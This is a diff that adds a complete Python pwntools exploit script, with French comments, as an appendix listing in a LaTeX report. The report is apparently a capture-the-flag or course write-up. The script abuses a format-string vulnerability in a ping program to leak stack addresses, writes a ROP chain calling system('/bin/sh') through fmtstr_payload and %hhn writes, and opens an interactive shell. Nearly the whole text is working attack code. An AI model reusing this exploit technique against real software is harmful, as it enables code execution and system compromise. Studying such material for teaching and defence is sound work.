@@ -1,3 +1,7 @@
+\newpage
+\section{Annexe : Script d'Exploitation Complet}
+
+\begin{lstlisting}[language=Python, caption={Script final d'exploitation (exploit.py)}, label={code:exploit}]
 #!/usr/bin/python3
 from pwn import *
 import re
@@ -28,15 +32,15 @@ log.info("=== Etape 1 : Leak des adresses ===")
 # On attend de devoir rentrer le ping
 p.recvuntil(b"address to ping:")
 
-# Playload de leak à injecter
-## Affiche le 26ème mot (Saved RBP) sur 16 caractères fixes.
-## Affiche le 27ème mot (Saved RIP) sur 16 caractères fixes.
-## Affiche 1 char de donnée + 202 espaces de remplissage.
-## Écrit la valeur du total (0xEE) à l'adresse pointée par l'arg 7.
+# Playload a injecter pour le leak
+## Affiche le 26eme mot (Saved RBP) sur 16 caracteres fixes.
+## Affiche le 27eme mot (Saved RIP) sur 16 caracteres fixes.
+## Affiche 1 char de donnee + 202 espaces de remplissage.
+## Ecrit la valeur du total (0xEE) a l'adresse pointee par l'arg 7.
 payload = "%26$16p | %27$16p%203c%7$hhn"
 p.sendline(payload.encode())
 
-# Parsing de la réponse pour extraire les adresses
+# Parsing de la reponse pour extraire les adresses
 raw_response = p.recvuntil(b"ping").decode(errors='ignore')
 leaks = re.findall(r"(0x[0-9a-fA-F]+)", raw_response) # On utilise une Regex pour trouver UNIQUEMENT les motifs "0x..."
 saved_rbp = int(leaks[0], 16) # Saved RBP
@@ -45,9 +49,9 @@ saved_rip = int(leaks[1], 16) # Saved RIP
 log.success(f"Saved RBP: {hex(saved_rbp)}")
 log.success(f"Saved RIP: {hex(saved_rip)}")
 
-##########################################################"
+##########################################################
 # ETAPE 2 : Calcul des adresses
-##########################################################"
+##########################################################
 log.info("=== Etape 2 : Calcul des adresses ===")
 
 # Calculs des addresses
@@ -60,11 +64,11 @@ addr_rip = addr_rbp + 8
 
 log.info(f"Adresse de system(): {hex(addr_system)}")
 log.info(f"Adresse du gadget POP RDI; RET: {hex(addr_gadget)}")
-log.info(f"Adresse de la chaîne '/bin/sh': {hex(addr_str)}")
-log.info(f"Adresse de retour (pour écraser): {hex(addr_rip)}")
+log.info(f"Adresse de la chaine '/bin/sh': {hex(addr_str)}")
+log.info(f"Adresse de retour (pour ecraser): {hex(addr_rip)}")
 log.info(f"Adresse du gadget RET (pour alignement): {hex(addr_ret)}")
 
-# Définition de la chaîne ROP
+# Definition de la chaine ROP
 rop_chain = {
     addr_rbp + 16 : addr_gadget,         # adresse pop rdi; ret 
     addr_rbp + 24 : addr_str,            # adresse chaine
@@ -72,17 +76,17 @@ rop_chain = {
     addr_rbp + 40 : u64(b'/bin/sh\x00'), # chaine 
 }
 
-###############################################################"
-# ETAPE 3 : Ecriture de la chaîne ROP
-###############################################################"
-log.info("=== Etape 3 : Ecriture de la chaîne ROP ===")
+###############################################################
+# ETAPE 3 : Ecriture de la chaine ROP
+###############################################################
+log.info("=== Etape 3 : Ecriture de la chaine ROP ===")
 
-# Ecriture de la chaîne ROP
+# Ecriture de la chaine ROP
 for addr, value in rop_chain.items():
     
-    # Lste de tuples contenant (Adresse Cible, Valeur à écrire)
-    ## Les 4 octets de poids faible à l'adresse 'addr'
-    ## Les 4 octets de poids fort à l'adresse 'addr + 4'
+    # Liste de tuples contenant (Adresse Cible, Valeur a ecrire)
+    ## Les 4 octets de poids faible a l'adresse 'addr'
+    ## Les 4 octets de poids fort a l'adresse 'addr + 4'
     mask32 = (1 << 32) - 1
     writes_sequence = [
         (addr, value & mask32),
@@ -94,7 +98,7 @@ for addr, value in rop_chain.items():
         
         current_writes = {
             target_addr: part_value, # La partie de la ROP chain
-            addr_rip: p8(0xee)       # Le maintien de la boucle
+            addr_rip: 0xee           # Le maintien de la boucle
         }
 
         payload = fmtstr_payload(
@@ -104,23 +108,24 @@ for addr, value in rop_chain.items():
         )
         
         p.sendline(payload)
-        log.info(f"Écriture de {hex(part_value)} à l'adresse {hex(target_addr)}")
+        log.info(f"Ecriture de {hex(part_value)} a l'adresse {hex(target_addr)}")
 
 #####################################################################################
-# ETAPE 4 : Ecriture de la chaîne ROP pour exécuter system("/bin/sh")
+# ETAPE 4 : Ecriture de la chaine ROP pour executer system("/bin/sh")
 #####################################################################################
 
 # On ne veut que les deux derniers octets de l'adresse de retour
 addr_ret_lsb = addr_ret & 0xff
 
-# Payload pour écraser l'adresse de retour avec le gadget RET
-## addr_ret_lsb : Valeur cible à écrire
+# Payload pour ecraser l'adresse de retour avec le gadget RET
+## addr_ret_lsb : Valeur cible a ecrire
 ## c : bourage
-## %7$ : Spécifie que l'adresse cible est le 7ème argument de la fonction d'affichage
-## hhn : écriture d'un octet à l'adresse pointée par l'argument 7
+## %7$ : Specifie que l'adresse cible est le 7eme argument de la fonction d'affichage
+## hhn : ecriture d'un octet a l'adresse pointee par l'argument 7
 payload = f"%{addr_ret_lsb}c%7$hhn"
 p.recvuntil("Please Insert an IP address to ping: ".encode())
 p.sendline(payload.encode())				
-log.info(f"Payload pour écraser l'adresse de retour avec le gadget RET envoyé (Valeur cible: {hex(addr_ret_lsb)})")
+log.info(f"Payload pour ecraser l'adresse de retour avec le gadget RET envoye (Valeur cible: {hex(addr_ret_lsb)})")
 
 p.interactive()
+\end{lstlisting}
